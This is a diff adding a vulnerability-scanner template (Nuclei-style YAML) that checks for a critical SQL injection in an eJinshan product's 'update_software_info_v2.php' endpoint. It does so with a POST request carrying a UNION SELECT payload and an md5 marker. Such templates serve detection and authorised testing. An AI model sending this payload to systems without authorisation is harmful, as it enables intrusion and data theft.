@@ -1,0 +1,15 @@
+id: yaml-poc-ejinshan-zdv9-sql_injection-CT-926438
+info:
+  name: Yaml Poc Ejinshan Zdv9 Sql_Injection Ct 926438
+  author: xiao.xiao
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-ejinshan-zdv9-sql_injection-CT-926438'
+  tags: sqli
+  reference: []
+http:
+- method: POST
+  path:
+  - /inter/update_software_info_v2.php
+  body: type=-100+UNION+SELECT+1,md5({{s1}}),3,4,5,6,7,8--&key=&pageCount=0&curPage=
+  headers:
+    Content-Type: application/x-www-form-urlencoded
